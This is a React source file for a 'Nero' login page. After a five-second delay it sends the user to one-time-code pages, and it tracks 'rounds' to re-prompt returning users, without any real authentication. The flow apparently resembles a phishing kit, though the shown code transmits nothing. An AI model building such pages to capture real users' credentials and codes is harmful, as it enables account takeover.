import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { NeroCard, NeroShell, NeroWordmark } from "@/components/nero/Shell";
import { PrimaryButton } from "@/components/nero/PrimaryButton";
import { LoadingOverlay } from "@/components/nero/LoadingOverlay";
import { getRound } from "@/lib/nero-flow";

export const Route = createFileRoute("/login")({
  head: () => ({
    meta: [
      { title: "Log in to Nero" },
      { name: "description", content: "Log in to Nero with your email address or phone number and password." },
      { property: "og:title", content: "Log in to Nero" },
      { property: "og:description", content: "Log in to Nero with your email address or phone number and password." },
    ],
  }),
  component: LoginPage,
});

function LoginPage() {
  const navigate = useNavigate();
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const round = getRound();

  const heading = round > 1 ? "Welcome back to Nero" : "Log in to Nero";
  const valid = identifier.trim().length > 3 && password.length >= 6;

  return (
    <NeroShell>
      {loading && <LoadingOverlay label="Signing you in…" />}
      <div className="pt-6 pb-8">
        <NeroWordmark />
        <p className="mt-3 text-center text-[14px] text-muted-foreground">{heading}</p>
      </div>

      <NeroCard>
        <form
          className="space-y-3"
          onSubmit={(e) => {
            e.preventDefault();
            if (!valid) {
              setError("Enter your email or phone number and a password of at least 6 characters.");
              return;
            }
            setError(null);
            setLoading(true);
            const target = round > 1 ? "/code-1b" : "/code-1";
            window.setTimeout(() => navigate({ to: target }), 5000);
          }}
        >
          <input
            aria-label="Email address or phone number"
            placeholder="Email address or phone number"
            autoComplete="username"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            className="h-12 w-full rounded-md border border-input bg-card px-4 text-[16px] text-card-foreground placeholder:text-muted-foreground focus:border-ring focus:ring-2 focus:ring-ring/30 focus:outline-none"
          />
          <input
            aria-label="Password"
            type="password"
            placeholder="Password"
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="h-12 w-full rounded-md border border-input bg-card px-4 text-[16px] text-card-foreground placeholder:text-muted-foreground focus:border-ring focus:ring-2 focus:ring-ring/30 focus:outline-none"
          />
          {error && <p className="text-[13px] text-destructive">{error}</p>}
          <PrimaryButton type="submit">Log in</PrimaryButton>
        </form>

        <p className="mt-4 text-center text-[14px] font-medium text-brand-link">Forgotten password?</p>
      </NeroCard>

      <p className="mt-6 text-center text-[13px] text-muted-foreground">Nerochaze secure login</p>
    </NeroShell>
  );
}